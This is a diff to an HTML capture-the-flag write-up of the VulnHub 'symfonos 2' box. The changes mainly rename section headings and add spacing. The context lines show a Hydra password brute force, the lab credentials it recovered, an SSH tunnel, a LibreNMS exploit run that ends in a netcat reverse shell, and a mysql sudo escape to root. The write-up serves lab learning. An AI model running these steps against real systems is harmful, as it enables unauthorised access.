@@ -18,9 +18,9 @@ layout: default
         <li><a href="#summary">Summary</a></li>
         <li><a href="#portscan">Port Scanning</a></li>
         <li><a href="#infogather">Information Gathering</a></li>
-        <li><a href="#foothold">Foothold</a></li>
-        <li><a href="#cronos">Privesc - cronos</a></li>
-        <li><a href="#root">Privesc - root</a></li>
+        <li><a href="#aeolus">Shell - aeolus</a></li>
+        <li><a href="#cronos">Shell - cronos</a></li>
+        <li><a href="#root">Shell - root</a></li>
     </ul>
 
 
@@ -73,14 +73,19 @@ layout: default
     </pre>
 
     <li>In the end, all this does for us is tell us that another user on the box is named cronus in addition to root.  We already know aeolus is a user based on the share path of /home/aerolus/share.</li>
-    
-    <h2><a id="foothold">Foothold</a></h2>
+
+    <br>
+
+    <h2><a id="aeolus">Shell - aeolus</a></h2>
 
     <li>We gain our foothold on this box by bruteforcing the password for the user aeolus.  In order to do this we use Hydra.  Initially I tried bruteforcing SSH but that kept on locking me out.  FTP did not lock me out and did end up correctly identifying the SSH password for aeolus.</li>
     <ul>
         <li>The hydra command I used: hydra -l aeolus -P /usr/share/wordlists/rockyou.txt ftp://10.0.0.14</li>
     </ul>
     <li>This brute forcing took a long time.  aeolus's password is on line 25076 of the rockyou.txt file, unfortunately.</li>
+
+    <br>
+
     <li>Hydra finishes and we end up with the creds aeolus:sergioteamo.  We login to SSH using these.</li>
 
     <pre>
@@ -88,6 +93,8 @@ layout: default
     </pre>
 
     <li>I ran linpeas.sh on this box and it did not tell me what ports were listening on the box.  However, it did tell me that nmap is on the box.  So I used nmap to enumerate all the ports that were listening on the box to see if there is anything that I was not able to detect externally from the nmap scan I did from my Kali machine.  I used the same port scanning methodology as I used from my Kali box.</li>
+
+    <br>
 
     <li>First I scanned the full port range to determine which ports are open</li>
 
@@ -107,11 +114,14 @@ layout: default
 &boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_2]&#13;&#10;&boxur;&HorizontalLine;$ sshpass -p sergioteamo ssh aeolus@10.0.0.14 -f -N -L 800:localhost:8080
     </pre>
 
-    <h2><a id="cronos">Privesc - cronos</a></h2>
+    <h2><a id="cronos">Shell - cronos</a></h2>
 
     <li>When I visit the web page it gives a logon screen for LibreNMS</li>
 
     <img src="../images/symfonos_2/librenms.png">
+
+    <br>
+    <br>
 
     <li>We are able to login here by reusing the credentials aeolus:sergioteamo.  When we check searchsploit for any exploits for LibreNMS we find a few.</li>
 
@@ -129,9 +139,15 @@ layout: default
 
     <img src="../images/symfonos_2/burp_intercept_settings.png")>
 
+    <br>
+    <br>
+
     <li>Now I try the exploit again and observe what is happening when the script attempts to execute the payload..</li>
 
     <img src="../images/symfonos_2/burp_response_unauthenticated.png">
+
+    <br>
+    <br>
 
     <li>As we can see. the server is responding with "unauthenticated" when it attempts to execute the payload.  In order to fix this, I first remove the Burp settings that are forwarding requests from 8080 to LibreNMS.  These settings are no longer required.  Then, I browse to http://127.0.0.1:800/ajax_output.php?hostname=dummydevice2&type=snmpwalk&id=capture&format=text just like the exploit was attempting to do.  I also intercept this request with burp so that I can compare the differences between the request I am sending to the web server and the request that the exploit it sending to the web server.  It turns out that the exploit was not including the CSRF token so we were getting the "unauthenticated" message instead of executing the payload.  When we browse to that URL manually, the payload executes successfully.</li>
 
@@ -143,13 +159,13 @@ layout: default
 &boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_2]&#13;&#10;&boxur;&HorizontalLine;$ nc -lvnp 80                                                                                                130 &Cross;&#13;&#10;Ncat: Version 7.91 ( https://nmap.org/ncat )&#13;&#10;Ncat: Listening on :::80&#13;&#10;Ncat: Listening on 0.0.0.0:80&#13;&#10;Ncat: Connection from 10.0.0.14.&#13;&#10;Ncat: Connection from 10.0.0.14:34152.&#13;&#10;/bin/sh: 0: can&apos;t access tty; job control turned off&#13;&#10;$ python3 -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;);&quot;&#13;&#10;cronus@symfonos2:/opt/librenms/html$ export TERM=xterm&#13;&#10;export TERM=xterm&#13;&#10;cronus@symfonos2:/opt/librenms/html$ ^Z&#13;&#10;zsh: suspended  nc -lvnp 80&#13;&#10;                                                                                                                     &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_2]&#13;&#10;&boxur;&HorizontalLine;$ stty raw -echo;fg;                                                                                     148 &Cross; 1 &#9881;&#13;&#10;[1]  + continued  nc -lvnp 80
     </pre>
 
+    <h2><a id="root">Shell - Root</a></h2>
+
     <li>On cronos I run sudo -l and find I have sudo access to /usr/bin/mysql as the user root.</li>
 
     <pre>
 cronus@symfonos2:/opt/librenms/html$ sudo -l&#13;&#10;Matching Defaults entries for cronus on symfonos2:&#13;&#10;    env_reset, mail_badpass,&#13;&#10;    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin&#13;&#10;&#13;&#10;User cronus may run the following commands on symfonos2:&#13;&#10;    (root) NOPASSWD: /usr/bin/mysql
     </pre>
-
-    <h2><a id="root">Privesc - Root</a></h2>
 
     <li>I take a look at GTFOBins and it tells me that I can use the command "sudo mysql -e '\! /bin/sh'" to privesc to root.</li>
 
